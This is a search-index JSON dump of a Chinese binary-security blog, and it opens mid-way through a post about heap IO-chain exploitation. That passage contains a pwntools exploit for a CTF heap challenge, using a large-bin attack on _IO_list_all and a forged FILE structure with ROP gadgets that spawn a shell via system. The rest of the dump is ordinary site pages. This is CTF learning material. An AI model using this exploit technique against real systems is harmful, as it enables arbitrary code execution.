isinstance(breakpoints, str):\n        breakpoints = [breakpoints]\n    script = \"\"\n    for bp in breakpoints:\n        script += f\"b {bp}\\n\"\n    gdb.attach(proc.pidof(io)[0], script)\n    pause()\n\ndef fmt(value, offset=14, size='hhn'):\n    if size == 'hhn':\n        num = value &amp; 0xff\n    elif size == 'hn':\n        num = value &amp; 0xffff\n    elif size == 'n':\n        num = value &amp; 0xffffffff\n    payload = f\"%{num}c%{offset}${size}\".encode()\n    #value 是格式化字符串偏移          \n    return payload\n\nlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))\n\ndef cat_flag():\n    flag_header = b'flag{'\n    sleep(1)\n    sl('cat flag')\n    ru(flag_header)\n    flag = flag_header + ru('}') + b'}'\n    exit(0)\n\n#asm(shellcraft.sh()).ljust(0x108,b'a')\n\ndef add(idx,size):\n    sla(b'&gt;&gt;',b'1')\n    sla(b'idx? ',str(idx).encode())\n    sla(b'size? ',str(size).encode())\n\ndef dele(idx):\n    sla(b'&gt;&gt;',b'2')\n    sla(b'idx? ',str(idx).encode())\n\ndef show(idx):\n    sla(b'&gt;&gt;',b'3')\n    sla(b'idx? ',str(idx).encode())\n\ndef edit(idx,commend):\n    sla(b'&gt;&gt;',b'4')\n    sla(b'idx? ',str(idx).encode())\n    sa(b'content :',commend)\n\ndef exit():\n    sla(b'&gt;&gt;',b'5')\n\ndebug(\"_fini\")\nadd(0,0x520)\nadd(1,0x30)\nadd(2,0x510)\nadd(3,0x30)\ndele(0)\n\nshow(0)\nru(b'content : ')\nlibc_base = uu64() - 96 - 0x21ac80\nlg(b'libc_base',libc_base)\nadd(4,0x550)\nedit(0,b'a'*0x10)\nshow(0)\nru(b'a'*0x10)\nheap_base = u64(io.recv(6).ljust(8,b'\\x00')) - 0x290\nlg(b'heap_base',heap_base)\n\nlarge = libc_base + 0x21b0e0     \t//写topchunk\nheap = heap_base + 0x800 - 0x10\n_IO_wfile_jumps = libc_base + 0x2170c0\n_IO_list_all = libc_base + libc.sym['_IO_list_all']\nlg(b'_IO_all_list',_IO_list_all)\nsys_addr = libc_base + libc.sym['system']\nfake_IO_addr = heap_base + 0x800\n_lock = libc_base + 0x21ca60\nedit(0,p64(large)+p64(large)+p64(_IO_list_all-0x20)+p64(_IO_list_all-0x20))  \ndele(2)\n#pause()\nadd(5,0x550)\ngadget1 = libc_base + 0x16a06a \n# mov    rbp,QWORD PTR [rdi+0x48]\n# mov    rax,QWORD PTR [rbp+0x18]\n# lea    r13,[rbp+0x10]\n# mov    DWORD PTR [rbp+0x10],0x0\n# mov    rdi,r13\n# call   QWORD PTR [rax+0x28]\n\ngadget2 = libc_base + 0x882cf\n#xor esi, esi ; mov rdi, rbp ; call qword ptr [r13 + 0x10]\n\n\nfake_IO_FILE = IO_FILE_plus_struct()\n# fake_IO_FILE.house_of_apple2_execmd_when_exit(_IO_list_all,_IO_wfile_jumps,sys_addr)\n\nfake_IO_FILE.vtable = p64(_IO_wfile_jumps)\nfake_IO_FILE._IO_save_base = p64(fake_IO_addr+0x260)\nfake_IO_FILE._mode = 0xffffffff\nfake_IO_FILE._lock = p64(_lock)\nfake_IO_FILE._wide_data = p64(fake_IO_addr+0x200)\nfake_IO_FILE._IO_write_ptr = p64(1)\nfake_IO_FILE._IO_write_base = p64(0)\n\npayload = bytes(fake_IO_FILE).ljust(0x200,b'\\x00')\t//之前卡在一个\npayload += p64(heap_base+0x2a0)\npayload = payload.ljust(0x260,b'\\x00')\npayload += b' sh;'\npayload = payload.ljust(0x270,b'\\x00')\npayload += p64(0)\npayload = payload.ljust(0x278,b'\\x00')\npayload += p64(fake_IO_addr+0x268)\npayload = payload.ljust(0x280,b'\\x00')\npayload += p64(sys_addr)\npayload = payload.ljust(0x290,b'\\x00')\npayload += p64(gadget2)\npayload = payload.ljust(0x2e0,b'\\x00')\npayload += p64(fake_IO_addr+0x300)\npayload = payload.ljust(0x368,b'\\x00')\npayload += p64(gadget1)\nedit(2,payload[0x10:])\nexit()\n\ninter()\n\n\n\n\n之前一直卡在这里没进去，服了，就是没修过rdp的值，导致[rbp+0x18]和[rdx+0x18]的值有冲突，一个必须为0，一个必须写数据，还好后面改了rbp就简单了，但是吧，还不够格，因为 mov    DWORD PTR [rbp+0x10],0x0又清零参数，恶心的很，还好再找个gadget2把’ sh;’参数传给rdi，就简单了\n\n\n\n找gadget也是真的有意思，直接tele看不见，只有x/8i addr 这样才看得到gadget\n",
        "url": "/%E6%8A%80%E6%9C%AF/2025/11/23/IOstudy/"
      },
    
  
  
  
  {
    "title": "关于",
    "excerpt": "\n",
    "content": "关于博主\n\n你好，我是 Liyck，一名专注于二进制分析和逆向工程的技术爱好者。这个博客是我分享学习经验、技术心得和实践项目的地方。\n\n技能方向\n\n\n  二进制分析与逆向工程\n    \n      可执行文件格式分析（PE、ELF等）\n      反汇编与静态分析\n      动态调试技术\n    \n  \n  系统底层技术\n    \n      内存管理与漏洞分析\n      系统调用与API分析\n      操作系统内核研究\n    \n  \n  安全技术\n    \n      漏洞挖掘与利用\n      恶意软件分析\n      CTF竞赛参与\n    \n  \n\n\n博客目标\n\n这个博客致力于：\n\n  记录逆向工程的学习过程和心得\n  提供清晰易懂的技术教程\n  与技术社区进行交流和讨论\n\n\n工具与环境\n\n\n  分析工具: IDA Pro, Ghidra, x64dbg, Radare2\n  编程语言: C/C++, Python, Assembly\n  操作系统: Windows, Linux\n  调试环境: WinDbg, GDB, QEMU\n\n\n欢迎通过 GitHub 与我交流讨论技术问题！\n\n\n\n\n  专注技术，持续学习，分享成长\n\n",
    "url": "/about/"
  },
  
  {
    "title": "所有分类",
    "excerpt": "\n",
    "content": "\n  所有分类\n  共 1 个分类 · 3 篇文章\n\n\n\n  \n  \n    \n    \n    \n      技术\n      3 篇\n    \n  \n\n\n\n\n",
    "url": "/categories/"
  },
  
  {
    "title": "Elements",
    "excerpt": "A demo of Markdown and HTML includes\n",
    "content": "Heading 1\n\nHeading 2\n\nHeading 3\n\nHeading 4\n\nHeading 5\n\nHeading 6\n\nA small element\n\nA link\n\nLorem ipsum dolor sit amet, consectetur adip* isicing elit, sed do eiusmod *tempor incididunt ut labore et dolore magna aliqua.\n\nDuis aute irure dolor in A link reprehenderit in voluptate velit esse cillum bold text dolore eu fugiat nulla pariatur. Excepteur span element sint occaecat cupidatat non proident, sunt italicised text in culpa qui officia deserunt mollit anim id some code est laborum.\n\n\n  An item\n  An item\n  An item\n  An item\n  An item\n\n\n\n  Item one\n  Item two\n  Item three\n  Item four\n  Item five\n\n\n\n  A simple blockquote\n\n\nSome HTML…\n\n1\n2\n3\n4\n5\n6\n&lt;blockquote cite=\"http://www.imdb.com/title/tt0284978/quotes/qt1375101\"&gt;\n  &lt;p&gt;You planning a vacation, Mr. Sullivan?&lt;/p&gt;\n  &lt;footer&gt;\n    &lt;a href=\"http://www.imdb.com/title/tt0284978/quotes/qt1375101\"&gt;Sunways Security Guard&lt;/a&gt;\n  &lt;/footer&gt;\n&lt;/blockquote&gt;\n\n\n…CSS…\n\n1\n2\n3\n4\n5\n6\n7\nblockquote {\n  text-align: center;\n  font-weight: bold;\n}\nblockquote footer {\n  font-size: .8rem;\n}\n\n\n…and JavaScript\n\n1\n2\n3\n4\n5\nconst blockquote = document.querySelector(\"blockquote\")\nconst bolden = (keyString, string) =&gt;\n  string.replace(new RegExp(keyString, 'g'), '&lt;strong&gt;'+keyString+'&lt;/strong&gt;')\n\nblockquote.innerHTML = bolden(\"Mr. Sullivan\", blockquote.innerHTML)\n\n\nSingle line of code\n\nHTML Includes\n\nContact form\n\n\n  \n    Contact\n    Name: *\n    \n\n    Email Address: *\n    \n\n    Message: *\n    \n\n    \n    \n    * indicates a required field\n\n    \n      \n      \n      \n    \n  \n\n\n\n\nPlease enable JavaScript to use the form.\n\n1\n{% include site-form.html %}\n\n\nDemo map embed\n\n\n\n1\n{% include map.html id=\"XXXXXX\" title=\"Coffee shop map\" %}\n\n\nButton include\n\nA button\n\nA button with icon  twitter\n\n\n1\n2\n{% include button.html text=\"A button\" link=\"https://david.darn.es\" %}\n{% include button.html text=\"A button with icon\" link=\"https://twitter.com/daviddarnes\" icon=\"twitter\" %}\n\n\nIcon include\n\ntwitter\ntwitter\n\n\n1\n2\n{% include icon.html id=\"twitter\" title=\"twitter\" %}\n[{% include icon.html id=\"linkedin\" title=\"twitter\" %}](https://www.linkedin.com/in/daviddarnes)\n\n\nVideo include\n\n\n  \n\n\n1\n{% include video.html id=\"zrkcGL5H3MU\" title=\"Siteleaf tutorial video\" %}\n\n\nImage includes\n\n\n  \n  Image with caption\n\n\n\n  \n  Right aligned image\n\n\n\n  \n  Left aligned image\n\n\n\n  \n  \n\n\n1\n2\n3\n4\n5\n6\n7\n{% include figure.html image=\"https://picsum.photos/600/800?image=894\" caption=\"Image with caption\" width=\"300\" height=\"800\" %}\n\n{% include figure.html image=\"https://picsum.photos/600/800?image=894\" caption=\"Right aligned image\" position=\"right\" width=\"300\" height=\"800\" %}\n\n{% include figure.html image=\"https://picsum.photos/600/800?image=894\" caption=\"Left aligned image\" position=\"left\" width=\"300\" height=\"800\" %}\n\n{% include figure.html image=\"https://picsum.photos/1600/800?image=894\" alt=\"Image with just alt text\" %}\n\n",
    "url": "/elements/"
  },
  
  {
    "title": "二进制手的技术博客",
    "excerpt": "专注于二进制技术与逆向工程的技术博客，分享实用技巧与深入分析。\n",
    "content": "欢迎来到我的个人技术博客！这里是我记录和分享二进制分析、逆向工程以及系统底层技术学习心得的地方。无论你是初学者还是有经验的技术人员，都希望这里的内容能为你的技术之路提供帮助。\n\n博客内容方向\n\n二进制文件分析\n\n  PE/ELF文件结构深度解析\n  可执行文件格式与加载机制\n  文件头信息与节区分析\n\n\n逆向工程实战\n\n  静态分析技术与工具使用\n  动态调试与运行时分析\n  反混淆与脱壳技术\n\n\n系统底层技术\n\n  内存管理与地址空间\n  系统调用与API挂钩\n  进程与线程机制研究\n\n\n安全研究\n\n  漏洞分析与利用技术\n  恶意软件行为分析\n  CTF逆向题目解析\n\n\n技术工具箱\n\n本博客涉及的主要工具和技术栈：\n\n\n  静态分析: IDA Pro, Ghidra, Radare2, Binary Ninja\n  动态调试: x64dbg, WinDbg, GDB, LLDB\n  编程语言: C/C++, Python, Assembly, PowerShell\n  系统平台: Windows, Linux, macOS\n  辅助工具: Hex编辑器, 反编译器, 虚拟机环境\n\n\n学习资源\n\n除了原创技术文章，还会定期分享：\n\n  优质技术书籍推荐\n  开源工具使用教程\n  在线课程和文档整理\n  技术会议与讲座笔记\n\n\n最新文章\n\n\n  \n    heap的IO链学习 - 2025年11月23日\n  \n  \n    seccomp沙盒绕过 - 2025年8月1日\n  \n  \n    我的第一篇博客 - 2025年6月16日\n  \n\n\n\n\n\n  持续学习，深入探索，分享成长\n在二进制的世界里，每一个字节都有它的故事\n\n",
    "url": "/"
  },
  
  {
    "title": "项目",
    "excerpt": "\n",
    "content": "📚 逆向工程学习笔记\n\n  描述: 系统整理逆向工程学习资料和实战案例\n  内容: IDA Pro使用技巧、汇编语言基础、调试技术\n  状态: 持续更新\n\n\nCTF参与记录\n\n记录参加各类CTF竞赛的解题过程和学习心得，包括：\n\n  二进制逆向题目分析\n  漏洞利用技术实践\n  工具使用经验总结\n\n\n\n\n\n  所有项目代码将在适当时机开源到 GitHub\n\n",
    "url": "/projects/"
  },
  
  {
    "title": "搜索",
    "excerpt": "\n",
    "content": "\n  \n    探索知识宝库\n    输入关键词，发现您感兴趣的内容\n  \n  \n  \n    \n      \n        \n      \n      \n      \n        搜索\n        \n          \n        \n      \n    \n  \n  \n  \n    \n      \n      正在搜索...\n    \n    \n    \n      \n        \n        \n        \n      \n      未找到相关结果\n      尝试使用不同的关键词进行搜索\n    \n    \n    \n  \n\n\n\n\n\n\n",
    "url": "/search/"
  },
  
  {
    "title": "Jekyll",
    "excerpt": "\n",
    "content": "\n",
    "url": "/tags/jekyll/"
  },
  
  {
    "title": "Markdown",
    "excerpt": "\n",
    "content": "\n",
    "url": "/tags/markdown/"
  },
  
  {
    "title": "技术",
    "excerpt": "\n",
    "content": "\n",
    "url": "/categories/%E6%8A%80%E6%9C%AF/"
  },
  
  {
    "title": "技术",
    "excerpt": "\n",
    "content": "\n  分类：{{ page.category }}\n  {{ site.categories[page.category].size }} 篇文章\n\n\n\n  {% for post in site.categories[page.category] %}\n    \n      {{ post.date | date: \"%Y年%m月%d日\" }}\n      {{ post.title }}\n      {{ post.excerpt | strip_html | truncate: 120 }}\n      阅读全文 →\n    \n  {% endfor %}\n\n\n\n\n",
    "url": "/categories/e68a80e69caf/"
  }
  
]

